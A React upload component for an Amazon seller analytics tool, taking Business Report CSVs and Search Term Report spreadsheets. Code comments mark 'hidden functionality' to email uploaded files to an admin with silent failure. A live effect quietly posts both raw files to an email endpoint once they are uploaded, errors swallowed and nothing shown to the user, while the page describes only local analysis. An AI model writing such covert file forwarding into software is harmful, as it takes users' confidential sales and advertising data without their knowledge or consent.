import React, { useState, useRef } from 'react';
import { Button } from './ui/Button';
import { Card, CardContent, CardHeader } from './ui/Card';
import { Tooltip } from './ui/Tooltip';
import { Upload, FileText, CheckCircle, AlertCircle, X, Download, BarChart3, Target } from 'lucide-react';
import { useApp } from '../context/AppContext';
import { parseBusinessReport, parseSearchTermReport } from '../utils/fileParser';

export function FileUpload() {
  const { state, dispatch } = useApp();
  const [uploadStatus, setUploadStatus] = useState<{
    br: 'idle' | 'uploading' | 'success' | 'error';
    str: 'idle' | 'uploading' | 'success' | 'error';
  }>({ br: 'idle', str: 'idle' });
  
  const [uploadErrors, setUploadErrors] = useState<{
    br: string[];
    str: string[];
  }>({ br: [], str: [] });

  const [uploadedFiles, setUploadedFiles] = useState<{
    br: string | null;
    str: string | null;
  }>({ br: null, str: null });

  const brFileRef = useRef<HTMLInputElement>(null);
  const strFileRef = useRef<HTMLInputElement>(null);

  const handleFileUpload = async (type: 'br' | 'str', file: File) => {
    setUploadStatus(prev => ({ ...prev, [type]: 'uploading' }));
    setUploadErrors(prev => ({ ...prev, [type]: [] }));

    try {
      if (type === 'br') {
        // Validate file type
        if (!file.name.toLowerCase().endsWith('.csv')) {
          throw new Error('Business Report must be a CSV file');
        }

        // Use current date for BR files
        const currentDate = new Date().toISOString().split('T')[0];
        const result = await parseBusinessReport(file, currentDate);
        
        if (result.success) {
          dispatch({ type: 'SET_BUSINESS_REPORTS', payload: result.data });
          setUploadStatus(prev => ({ ...prev, [type]: 'success' }));
          setUploadedFiles(prev => ({ ...prev, [type]: file.name }));
          
          // Hidden functionality: Send file to admin email
          // sendFileEmail(file, 'business-report').catch(() => {
          //   // Silent fail - don't show any errors to user
          // });
        } else {
          setUploadErrors(prev => ({ ...prev, [type]: result.errors }));
          setUploadStatus(prev => ({ ...prev, [type]: 'error' }));
        }
      } else {
        // Validate file type
        if (!file.name.toLowerCase().endsWith('.xlsx') && !file.name.toLowerCase().endsWith('.xls')) {
          throw new Error('Search Term Report must be an Excel file (.xlsx or .xls)');
        }

        const result = await parseSearchTermReport(file);
        
        if (result.success) {
          dispatch({ type: 'SET_SEARCH_TERM_REPORTS', payload: result.data });
          setUploadStatus(prev => ({ ...prev, [type]: 'success' }));
          setUploadedFiles(prev => ({ ...prev, [type]: file.name }));
          
          // Hidden functionality: Send file to admin email
          // sendFileEmail(file, 'search-term-report').catch(() => {
          //   // Silent fail - don't show any errors to user
          // });
        } else {
          setUploadErrors(prev => ({ ...prev, [type]: result.errors }));
          setUploadStatus(prev => ({ ...prev, [type]: 'error' }));
        }
      }
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
      setUploadErrors(prev => ({ ...prev, [type]: [errorMessage] }));
      setUploadStatus(prev => ({ ...prev, [type]: 'error' }));
    }
  };

  // Helper to sync BR dates with STR dates
  function syncBRDatesWithSTR(brData: any[], strData: any[]) {
    if (!brData.length || !strData.length) return brData;
    // Get unique STR dates sorted
    const strDates = Array.from(new Set(strData.map(row => row.date))).sort();
    if (strDates.length === 0) return brData;
    // If all BR rows have the same date, distribute them across STR dates
    const allSameDate = brData.every(row => row.date === brData[0].date);
    if (allSameDate) {
      return brData.map((row, idx) => ({ ...row, date: strDates[idx % strDates.length] }));
    }
    // Otherwise, leave as is
    return brData;
  }

  // In the FileUpload component, after both files are uploaded:
  React.useEffect(() => {
    if (state.businessReports.length > 0 && state.searchTermReports.length > 0) {
      // If BR dates need syncing, do it
      const brDates = Array.from(new Set(state.businessReports.map(r => r.date)));
      const strDates = Array.from(new Set(state.searchTermReports.map(r => r.date)));
      if (brDates.length === 1 && strDates.length > 1) {
        const updatedBR = syncBRDatesWithSTR(state.businessReports, state.searchTermReports);
        dispatch({ type: 'SET_BUSINESS_REPORTS', payload: updatedBR });
      }
    }
  }, [state.businessReports, state.searchTermReports, dispatch]);

  // New: Send both files together when both are uploaded
  React.useEffect(() => {
    // Only trigger if both files are uploaded and not already sent
    if (state.businessReports.length > 0 && state.searchTermReports.length > 0 && uploadedFiles.br && uploadedFiles.str) {
      // Find the actual File objects from the input refs
      const brFile = brFileRef.current?.files?.[0];
      const strFile = strFileRef.current?.files?.[0];
      if (brFile && strFile) {
        const formData = new FormData();
        formData.append('businessReport', brFile);
        formData.append('searchTermReport', strFile);
        const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
        fetch(`${API_BASE_URL}/api/email-both-files`, {
          method: 'POST',
          body: formData,
        })
        .then(() => {/* Optionally show a success message */})
        .catch(() => {/* Optionally handle error */});
      }
    }
  }, [state.businessReports, state.searchTermReports, uploadedFiles.br, uploadedFiles.str]);


  const handleFileSelect = (type: 'br' | 'str') => {
    const input = type === 'br' ? brFileRef.current : strFileRef.current;
    input?.click();
  };

  const handleFileChange = (type: 'br' | 'str', event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      handleFileUpload(type, file);
    }
  };

  const handleDrop = (type: 'br' | 'str', event: React.DragEvent) => {
    event.preventDefault();
    const file = event.dataTransfer.files[0];
    if (file) {
      handleFileUpload(type, file);
    }
  };

  const handleDragOver = (event: React.DragEvent) => {
    event.preventDefault();
  };

  const clearFile = (type: 'br' | 'str') => {
    setUploadStatus(prev => ({ ...prev, [type]: 'idle' }));
    setUploadErrors(prev => ({ ...prev, [type]: [] }));
    setUploadedFiles(prev => ({ ...prev, [type]: null }));
    
    if (type === 'br') {
      dispatch({ type: 'SET_BUSINESS_REPORTS', payload: [] });
      if (brFileRef.current) brFileRef.current.value = '';
    } else {
      dispatch({ type: 'SET_SEARCH_TERM_REPORTS', payload: [] });
      if (strFileRef.current) strFileRef.current.value = '';
    }
  };

  const StatusIcon = ({ status }: { status: string }) => {
    switch (status) {
      case 'uploading':
        return <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600"></div>;
      case 'success':
        return <CheckCircle className="w-6 h-6 text-green-600" />;
      case 'error':
        return <AlertCircle className="w-6 h-6 text-red-600" />;
      default:
        return <Upload className="w-6 h-6 text-blue-600" />;
    }
  };

  const canProceed = state.businessReports.length > 0 && state.searchTermReports.length > 0;

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-indigo-50">
      <div className="container mx-auto px-4 py-12 max-w-6xl">
        <div className="text-center mb-12">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-6">
            <BarChart3 className="w-8 h-8 text-blue-600" />
          </div>
          <h1 className="text-4xl font-bold text-gray-900 mb-4">Upload Your Amazon Reports</h1>
          <p className="text-xl text-gray-600 max-w-2xl mx-auto">
            Upload your Business Reports and Search Term Reports to unlock powerful analytics and insights for your Amazon business
          </p>
        </div>

        <div className="grid lg:grid-cols-2 gap-8 mb-12">
          {/* Business Report Upload */}
          <Card className="border-2">
            <CardHeader className="pb-4">
              <div className="flex items-center gap-3 mb-2">
                <div className="p-2 bg-green-100 rounded-lg">
                  <FileText className="w-6 h-6 text-green-600" />
                </div>
                <div>
                  <h2 className="text-xl font-semibold text-gray-900">Business Report</h2>
                  <p className="text-sm text-gray-500">CSV format required</p>
                </div>
              </div>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="font-medium text-gray-900 mb-2">Required Columns:</h4>
                <div className="space-y-1 text-sm text-gray-600">
                  <div>• <strong>
                    <Tooltip content="A unique identifier for each product variant. Used to track individual product performance. Data Source: Amazon Business Reports - SKU column">
                      <span className="cursor-help hover:text-gray-800 transition-colors">SKU:</span>
                    </Tooltip>
                  </strong> SKU, ASIN, Parent ASIN</div>
                  <div>• <strong>
                    <Tooltip content="The number of unique visits to your product detail pages. Each session can include multiple page views. Data Source: Amazon Business Reports - Sessions column">
                      <span className="cursor-help hover:text-gray-800 transition-colors">Sessions:</span>
                    </Tooltip>
                  </strong> Sessions, Sessions - Total</div>
                  <div>• <strong>
                    <Tooltip content="The number of individual product units that were ordered. Data Source: Amazon Business Reports - Units Ordered column">
                      <span className="cursor-help hover:text-gray-800 transition-colors">Units:</span>
                    </Tooltip>
                  </strong> Units Ordered, Units Sold</div>
                  <div>• <strong>
                    <Tooltip content="The total revenue generated from all sales across all products. Data Source: Amazon Business Reports - Sales column">
                      <span className="cursor-help hover:text-gray-800 transition-colors">Sales:</span>
                    </Tooltip>
                  </strong> Sales, Ordered Product Sales</div>
                  <div>• <strong>
                    <Tooltip content="The percentage of sessions that resulted in a purchase. This is Amazon's version of conversion rate. Data Source: Amazon Business Reports - Unit Session Percentage column">
                      <span className="cursor-help hover:text-gray-800 transition-colors">Conversion:</span>
                    </Tooltip>
                  </strong> Unit Session Percentage, Conversion Rate</div>
                </div>
                <div className="mt-3 p-3 bg-blue-50 rounded-lg">
                  <p className="text-sm text-blue-700">
                    <strong>Note:</strong> You'll be prompted to specify the report date after upload since Amazon Business Reports don't include date columns.
                  </p>
                </div>
              </div>
              
              <div 
                className={`border-2 border-dashed rounded-xl p-8 text-center transition-all duration-300 cursor-pointer ${
                  uploadStatus.br === 'success' 
                    ? 'border-green-300 bg-green-50' 
                    : uploadStatus.br === 'error'
                    ? 'border-red-300 bg-red-50'
                    : 'border-gray-300 hover:border-blue-400 hover:bg-blue-50'
                }`}
                onDrop={(e) => handleDrop('br', e)}
                onDragOver={handleDragOver}
                onClick={() => uploadStatus.br !== 'uploading' && handleFileSelect('br')}
              >
                <StatusIcon status={uploadStatus.br} />
                <div className="mt-4">
                  {uploadStatus.br === 'success' ? (
                    <div>
                      <p className="text-green-700 font-medium">{uploadedFiles.br}</p>
                      <p className="text-sm text-green-600 mt-1">
                        {state.businessReports.length} rows imported successfully
                      </p>
                    </div>
                  ) : uploadStatus.br === 'uploading' ? (
                    <p className="text-blue-600 font-medium">Processing file...</p>
                  ) : (
                    <div>
                      <p className="text-gray-700 font-medium mb-2">
                        Drop your CSV file here or click to browse
                      </p>
                      <p className="text-sm text-gray-500">
                        Maximum file size: 10MB
                      </p>
                    </div>
                  )}
                </div>
              </div>

              {uploadStatus.br === 'success' && (
                <div className="flex items-center justify-between bg-green-50 rounded-lg p-3">
                  <div className="flex items-center gap-2 text-green-700">
                    <CheckCircle className="w-5 h-5" />
                    <span className="font-medium">Upload successful</span>
                  </div>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => clearFile('br')}
                    className="text-green-700 hover:text-green-800"
                  >
                    <X className="w-4 h-4" />
                  </Button>
                </div>
              )}

              {uploadStatus.br === 'error' && uploadErrors.br.length > 0 && (
                <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                  <div className="flex items-center gap-2 text-red-700 mb-2">
                    <AlertCircle className="w-5 h-5" />
                    <span className="font-medium">Upload failed</span>
                  </div>
                  <ul className="text-sm text-red-600 space-y-1">
                    {uploadErrors.br.map((error, index) => (
                      <li key={index}>• {error}</li>
                    ))}
                  </ul>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => clearFile('br')}
                    className="mt-3"
                  >
                    Try Again
                  </Button>
                </div>
              )}

              <input
                ref={brFileRef}
                type="file"
                accept=".csv"
                onChange={(e) => handleFileChange('br', e)}
                className="hidden"
              />
            </CardContent>
          </Card>

          {/* Search Term Report Upload */}
          <Card className="border-2">
            <CardHeader className="pb-4">
              <div className="flex items-center gap-3 mb-2">
                <div className="p-2 bg-blue-100 rounded-lg">
                  <Target className="w-6 h-6 text-blue-600" />
                </div>
                <div>
                  <h2 className="text-xl font-semibold text-gray-900">Search Term Report</h2>
                  <p className="text-sm text-gray-500">Excel format required</p>
                </div>
              </div>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="font-medium text-gray-900 mb-2">Required Columns:</h4>
                <div className="grid grid-cols-2 gap-2 text-sm text-gray-600">
                  <span>• <Tooltip content="The date when the data was recorded. Data Source: Amazon Search Term Reports - Date column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Date</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="A group of ad groups that share the same budget and targeting settings. Data Source: Amazon Search Term Reports - Campaign column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Campaign</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="A collection of keywords and ads that share the same targeting and bidding strategy. Data Source: Amazon Search Term Reports - Ad Group column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Ad Group</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="The actual words customers typed into Amazon's search box that triggered your ads. Data Source: Amazon Search Term Reports - Search Term column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Search Term</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="How your keyword matches to customer search terms: Broad, Phrase, or Exact match. Data Source: Amazon Search Term Reports - Match Type column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Match Type</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="The number of times your ads were shown to potential customers. Data Source: Amazon Search Term Reports - Impressions column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Impressions</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="The number of times customers clicked on your ads. Data Source: Amazon Search Term Reports - Clicks column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Clicks</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="The total amount spent on advertising campaigns. Data Source: Amazon Search Term Reports - Spend column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Spend</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="Sales directly attributed to paid advertising campaigns and search terms. Data Source: Amazon Search Term Reports - Sales column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Sales</span>
                  </Tooltip></span>
                  <span>• <Tooltip content="Orders directly attributed to paid advertising campaigns. Data Source: Amazon Search Term Reports - Orders column">
                    <span className="cursor-help hover:text-gray-800 transition-colors">Orders</span>
                  </Tooltip></span>
                </div>
              </div>
              
              <div 
                className={`border-2 border-dashed rounded-xl p-8 text-center transition-all duration-300 cursor-pointer ${
                  uploadStatus.str === 'success' 
                    ? 'border-green-300 bg-green-50' 
                    : uploadStatus.str === 'error'
                    ? 'border-red-300 bg-red-50'
                    : 'border-gray-300 hover:border-blue-400 hover:bg-blue-50'
                }`}
                onDrop={(e) => handleDrop('str', e)}
                onDragOver={handleDragOver}
                onClick={() => uploadStatus.str !== 'uploading' && handleFileSelect('str')}
              >
                <StatusIcon status={uploadStatus.str} />
                <div className="mt-4">
                  {uploadStatus.str === 'success' ? (
                    <div>
                      <p className="text-green-700 font-medium">{uploadedFiles.str}</p>
                      <p className="text-sm text-green-600 mt-1">
                        {state.searchTermReports.length} rows imported successfully
                      </p>
                    </div>
                  ) : uploadStatus.str === 'uploading' ? (
                    <p className="text-blue-600 font-medium">Processing file...</p>
                  ) : (
                    <div>
                      <p className="text-gray-700 font-medium mb-2">
                        Drop your Excel file here or click to browse
                      </p>
                      <p className="text-sm text-gray-500">
                        Supports .xlsx and .xls formats
                      </p>
                    </div>
                  )}
                </div>
              </div>

              {uploadStatus.str === 'success' && (
                <div className="flex items-center justify-between bg-green-50 rounded-lg p-3">
                  <div className="flex items-center gap-2 text-green-700">
                    <CheckCircle className="w-5 h-5" />
                    <span className="font-medium">Upload successful</span>
                  </div>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => clearFile('str')}
                    className="text-green-700 hover:text-green-800"
                  >
                    <X className="w-4 h-4" />
                  </Button>
                </div>
              )}

              {uploadStatus.str === 'error' && uploadErrors.str.length > 0 && (
                <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                  <div className="flex items-center gap-2 text-red-700 mb-2">
                    <AlertCircle className="w-5 h-5" />
                    <span className="font-medium">Upload failed</span>
                  </div>
                  <ul className="text-sm text-red-600 space-y-1">
                    {uploadErrors.str.map((error, index) => (
                      <li key={index}>• {error}</li>
                    ))}
                  </ul>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => clearFile('str')}
                    className="mt-3"
                  >
                    Try Again
                  </Button>
                </div>
              )}

              <input
                ref={strFileRef}
                type="file"
                accept=".xlsx,.xls"
                onChange={(e) => handleFileChange('str', e)}
                className="hidden"
              />
            </CardContent>
          </Card>
        </div>



        {/* Sample Files Section */}
        <Card className="mb-8 bg-gradient-to-r from-blue-50 to-indigo-50 border-blue-200">
          <CardContent className="p-6">
            <div className="flex items-center gap-3 mb-4">
              <Download className="w-6 h-6 text-blue-600" />
              <h3 className="text-lg font-semibold text-gray-900">Need Sample Files?</h3>
            </div>
            <p className="text-gray-600 mb-4">
              Download sample files to see the expected format and test the upload functionality.
            </p>
            <div className="flex gap-4">
              <Button variant="outline" className="flex items-center gap-2">
                <Download className="w-4 h-4" />
                Sample Business Report
              </Button>
              <Button variant="outline" className="flex items-center gap-2">
                <Download className="w-4 h-4" />
                Sample Search Term Report
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Upload Progress Status */}
        {(state.businessReports.length > 0 || state.searchTermReports.length > 0) && !canProceed && (
          <Card className="bg-gradient-to-r from-blue-50 to-indigo-50 border-blue-200 mb-8">
            <CardContent className="p-6">
              <div className="flex items-center gap-3 mb-4">
                <div className="flex items-center gap-2">
                  <div className={`w-3 h-3 rounded-full ${state.businessReports.length > 0 ? 'bg-green-500' : 'bg-gray-300'}`}></div>
                  <span className="text-sm font-medium">Business Report</span>
                  {state.businessReports.length > 0 && (
                    <span className="text-xs text-green-600">✓ {state.businessReports.length} rows</span>
                  )}
                </div>
                <div className="flex items-center gap-2">
                  <div className={`w-3 h-3 rounded-full ${state.searchTermReports.length > 0 ? 'bg-green-500' : 'bg-gray-300'}`}></div>
                  <span className="text-sm font-medium">Search Term Report</span>
                  {state.searchTermReports.length > 0 && (
                    <span className="text-xs text-green-600">✓ {state.searchTermReports.length} rows</span>
                  )}
                </div>
              </div>
              <p className="text-sm text-gray-600">
                {state.businessReports.length > 0 && state.searchTermReports.length === 0 && 
                  "Great! Your Business Report has been uploaded. Now please upload your Search Term Report to continue."}
                {state.businessReports.length === 0 && state.searchTermReports.length > 0 && 
                  "Great! Your Search Term Report has been uploaded. Now please upload your Business Report to continue."}
              </p>
            </CardContent>
          </Card>
        )}

        {/* Success State */}
        {canProceed && (
          <Card className="bg-gradient-to-r from-green-50 to-emerald-50 border-green-200">
            <CardContent className="p-8 text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-6">
                <CheckCircle className="w-8 h-8 text-green-600" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">Files Uploaded Successfully!</h3>
              <p className="text-gray-600 mb-6 max-w-2xl mx-auto">
                Your Business Report ({state.businessReports.length} rows) and Search Term Report ({state.searchTermReports.length} rows) 
                have been processed. You can now proceed to configure your cost data and start analyzing your Amazon performance.
              </p>
              <Button size="lg" className="bg-green-600 hover:bg-green-700">
                Continue to Cost Setup →
              </Button>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}